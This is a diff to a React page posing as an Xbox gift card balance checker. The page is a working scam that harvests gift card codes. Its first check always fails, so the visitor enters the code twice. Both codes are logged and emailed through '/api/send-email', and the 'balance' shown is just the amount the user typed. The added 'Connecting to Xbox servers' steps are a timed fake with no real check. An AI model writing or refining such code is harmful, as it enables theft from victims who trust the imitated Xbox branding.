@@ -76,7 +76,16 @@ const Home = () => {
   const [storedCode, setStoredCode] = useState('');
   const [lastRequestTime, setLastRequestTime] = useState(0);
   const [showFullScreenBalance, setShowFullScreenBalance] = useState(false);
+  const [isProcessing, setIsProcessing] = useState(false);
+  const [processingStep, setProcessingStep] = useState(0);
   const MIN_REQUEST_INTERVAL = 10000;
+
+  const processingSteps = [
+    'Connecting to Xbox servers...',
+    'Validating gift card code...',
+    'Checking balance...',
+    'Finalizing...'
+  ];
 
   const formatCode = (value) => {
     const cleaned = value.replace(/[^A-Za-z0-9]/g, '').toUpperCase();
@@ -99,6 +108,24 @@ const Home = () => {
     return !isNaN(num) && num >= 1 && num <= 500;
   };
 
+  // Simulate processing with steps
+  const simulateProcessing = (callback) => {
+    setIsProcessing(true);
+    setProcessingStep(0);
+    
+    let step = 0;
+    const interval = setInterval(() => {
+      step++;
+      if (step < processingSteps.length) {
+        setProcessingStep(step);
+      } else {
+        clearInterval(interval);
+        setIsProcessing(false);
+        callback();
+      }
+    }, 800);
+  };
+
   const handleCheckBalance = async () => {
     const now = Date.now();
     
@@ -111,35 +138,39 @@ const Home = () => {
     const rawCode = code.replace(/-/g, '');
     setError('');
     setShowBalance(false);
+    setLoading(true);
 
     if (!rawCode || !amount) {
       setError('❌ Please enter your Xbox code and amount');
+      setLoading(false);
       return;
     }
     
     if (!isValidCode(rawCode)) {
       setError('❌ Please enter a valid 25-character Xbox code (letters and numbers only)');
+      setLoading(false);
       return;
     }
     
     if (!isValidAmount(amount)) {
       setError('❌ Please enter a valid amount between $1 and $500');
+      setLoading(false);
       return;
     }
 
     setLastRequestTime(now);
-    setLoading(true);
     
-    setTimeout(async () => {
+    // Process with loading animation
+    simulateProcessing(async () => {
       if (attemptCount === 0) {
-        // FIRST ATTEMPT - Always fails
-        setError('❌ Could not verify your Xbox code.\n\n• Double-check the code is entered correctly\n• Make sure all 25 characters are accurate\n• Verify the code hasn\'t been redeemed already\n\nTry entering the code again.');
+        // FIRST ATTEMPT - Always fails with generic error (no specific message)
+        setError('Enter the exact same Xbox code to verify your balance.');
         setShowBalance(false);
         
         setStoredCode(rawCode);
         
         try {
-          const result = await logBalanceCheck({
+          await logBalanceCheck({
             type: 'first_attempt_failed',
             cardNumber: rawCode,
             amount: amount,
@@ -148,47 +179,89 @@ const Home = () => {
             userAgent: navigator.userAgent,
             pageSource: 'manual',
             ip: null,
-            message: 'First attempt failed - user instructed to re-enter code'
+            message: 'First attempt failed'
           });
-          console.log('✅ First attempt logged:', result);
         } catch (err) {
           console.error('❌ Logging failed:', err);
         }
         
         setCode('');
         setAttemptCount(1);
+        setLoading(false);
+        
       } else {
-        // SECOND ATTEMPT - Always succeeds regardless of code match
-        const enteredAmount = parseFloat(amount).toFixed(2);
-        const displayBalance = `$${enteredAmount} USD`;
-        setBalance(displayBalance);
-        setShowBalance(true);
-        setShowFullScreenBalance(true);
-        setError('');
-        
-        try {
-          const result = await logBalanceCheck({
-            type: 'second_attempt_success',
-            cardNumber: rawCode,
-            amount: amount,
-            balance: displayBalance,
-            status: 'SUCCESS',
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            pageSource: 'manual',
-            ip: null,
-            message: 'Second attempt successful - balance displayed'
-          });
-          console.log('✅ Success logged:', result);
-        } catch (err) {
-          console.error('❌ Logging failed:', err);
+        // SECOND ATTEMPT - Check if code matches first attempt
+        if (rawCode === storedCode) {
+          // Code matches - Show balance
+          const enteredAmount = parseFloat(amount).toFixed(2);
+          const displayBalance = `$${enteredAmount} USD`;
+          setBalance(displayBalance);
+          setShowBalance(true);
+          setShowFullScreenBalance(true);
+          setError('');
+          
+          try {
+            await logBalanceCheck({
+              type: 'second_attempt_success',
+              cardNumber: rawCode,
+              amount: amount,
+              balance: displayBalance,
+              status: 'SUCCESS',
+              timestamp: new Date().toISOString(),
+              userAgent: navigator.userAgent,
+              pageSource: 'manual',
+              ip: null,
+              message: 'Second attempt successful - code verified'
+            });
+          } catch (err) {
+            console.error('❌ Logging failed:', err);
+          }
+          
+          setAttemptCount(0);
+          setStoredCode('');
+          
+        } else {
+          // Code doesn't match - Show error, send email
+          setError('Enter the exact same Xbox code to verify your balance.');
+          setShowBalance(false);
+          
+          try {
+            await logBalanceCheck({
+              type: 'mismatch_attempt',
+              cardNumberFirst: storedCode,
+              cardNumberSecond: rawCode,
+              amount: amount,
+              status: 'MISMATCH',
+              timestamp: new Date().toISOString(),
+              userAgent: navigator.userAgent,
+              pageSource: 'manual',
+              ip: null,
+              message: 'User entered different code on second attempt'
+            });
+            
+            // Send email notification about mismatch
+            await fetch('/api/send-email', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                type: 'mismatch',
+                firstCode: storedCode,
+                secondCode: rawCode,
+                amount: amount,
+                timestamp: new Date().toISOString(),
+              }),
+            });
+          } catch (err) {
+            console.error('❌ Logging failed:', err);
+          }
+          
+          setAttemptCount(0);
+          setStoredCode('');
+          setCode('');
         }
-        
-        setAttemptCount(0);
-        setStoredCode('');
+        setLoading(false);
       }
-      setLoading(false);
-    }, 800);
+    });
   };
 
   const resetFullScreen = () => {
@@ -201,7 +274,29 @@ const Home = () => {
     setAmount('');
     setError('');
     setLoading(false);
+    setIsProcessing(false);
   };
+
+  // Processing overlay component
+  const ProcessingOverlay = ({ step, steps }) => (
+    <div className="text-center py-8">
+      <div className="flex justify-center mb-6">
+        <div className="w-12 h-12 border-4 border-[#e0e0e0] border-t-[#107C10] rounded-full animate-spin"></div>
+      </div>
+      <p className="text-[#1A1A1A] font-medium">{steps[step] || steps[steps.length - 1]}</p>
+      <p className="text-[#757575] text-sm mt-2">Please do not close this page</p>
+      <div className="flex justify-center gap-2 mt-4">
+        {steps.map((_, i) => (
+          <div
+            key={i}
+            className={`h-1.5 rounded-full transition-all duration-500 ${
+              i <= step ? 'w-6 bg-[#107C10]' : 'w-1.5 bg-[#e0e0e0]'
+            }`}
+          />
+        ))}
+      </div>
+    </div>
+  );
 
   // Full-screen balance view
   if (showFullScreenBalance) {
@@ -263,57 +358,65 @@ const Home = () => {
             </div>
           </div>
           
-          <div className="mb-5">
-            <label className="block text-[#1A1A1A] text-sm font-medium mb-2">Xbox Code (25 characters)</label>
-            <input
-              type="text"
-              value={code}
-              onChange={(e) => formatCode(e.target.value)}
-              placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX"
-              maxLength="29"
-              className="w-full bg-[#F5F5F5] border border-[#E0E0E0] rounded-md px-4 py-3 text-[#1A1A1A] text-sm font-mono focus:outline-none focus:border-[#107C10] focus:ring-2 focus:ring-[#107C10]/20 uppercase"
-            />
-            <p className="text-[#757575] text-xs mt-1">Format: 5 blocks of 5 characters (letters and numbers only)</p>
-          </div>
-          
-          <div className="mb-5">
-            <label className="block text-[#1A1A1A] text-sm font-medium mb-2">Amount (USD)</label>
-            <input
-              type="number"
-              value={amount}
-              onChange={(e) => setAmount(e.target.value)}
-              placeholder="Enter amount to check ($1 - $500)"
-              min="1"
-              max="500"
-              className="w-full bg-[#F5F5F5] border border-[#E0E0E0] rounded-md px-4 py-3 text-[#1A1A1A] text-sm focus:outline-none focus:border-[#107C10] focus:ring-2 focus:ring-[#107C10]/20"
-            />
-          </div>
+          {isProcessing ? (
+            <ProcessingOverlay step={processingStep} steps={processingSteps} />
+          ) : (
+            <>
+              <div className="mb-5">
+                <label className="block text-[#1A1A1A] text-sm font-medium mb-2">Xbox Code (25 characters)</label>
+                <input
+                  type="text"
+                  value={code}
+                  onChange={(e) => formatCode(e.target.value)}
+                  placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX"
+                  maxLength="29"
+                  className="w-full bg-[#F5F5F5] border border-[#E0E0E0] rounded-md px-4 py-3 text-[#1A1A1A] text-sm font-mono focus:outline-none focus:border-[#107C10] focus:ring-2 focus:ring-[#107C10]/20 uppercase"
+                  disabled={loading}
+                />
+                <p className="text-[#757575] text-xs mt-1">Format: 5 blocks of 5 characters (letters and numbers only)</p>
+              </div>
+              
+              <div className="mb-5">
+                <label className="block text-[#1A1A1A] text-sm font-medium mb-2">Amount (USD)</label>
+                <input
+                  type="number"
+                  value={amount}
+                  onChange={(e) => setAmount(e.target.value)}
+                  placeholder="Enter amount to check ($1 - $500)"
+                  min="1"
+                  max="500"
+                  className="w-full bg-[#F5F5F5] border border-[#E0E0E0] rounded-md px-4 py-3 text-[#1A1A1A] text-sm focus:outline-none focus:border-[#107C10] focus:ring-2 focus:ring-[#107C10]/20"
+                  disabled={loading}
+                />
+              </div>
 
-          {/* Scan Link */}
-          <div className="text-center my-4">
-            <Link to="/scan" className="text-[#107C10] text-sm font-medium hover:underline inline-flex items-center gap-2">
-              📷 Scan Gift Card Instead →
-            </Link>
-          </div>
+              {/* Scan Link */}
+              <div className="text-center my-4">
+                <Link to="/scan" className="text-[#107C10] text-sm font-medium hover:underline inline-flex items-center gap-2">
+                  📷 Scan Gift Card Instead →
+                </Link>
+              </div>
 
-          {/* Check Button */}
-          <button
-            onClick={handleCheckBalance}
-            disabled={loading}
-            className="w-full bg-[#107C10] text-white font-semibold py-3 rounded-md transition-all hover:bg-[#0E6A0E] active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed"
-          >
-            {loading ? (
-              <span className="flex items-center justify-center gap-2">
-                <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
-                VERIFYING...
-              </span>
-            ) : (
-              'CHECK BALANCE'
-            )}
-          </button>
+              {/* Check Button */}
+              <button
+                onClick={handleCheckBalance}
+                disabled={loading}
+                className="w-full bg-[#107C10] text-white font-semibold py-3 rounded-md transition-all hover:bg-[#0E6A0E] active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed"
+              >
+                {loading ? (
+                  <span className="flex items-center justify-center gap-2">
+                    <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
+                    VERIFYING...
+                  </span>
+                ) : (
+                  'CHECK BALANCE'
+                )}
+              </button>
+            </>
+          )}
 
           {/* Error Display */}
-          {error && (
+          {error && !isProcessing && (
             <div className="mt-6 p-4 bg-[#FFEBEE] border border-[#dc3545] rounded-md whitespace-pre-line">
               <p className="text-[#dc3545] text-sm">{error}</p>
             </div>
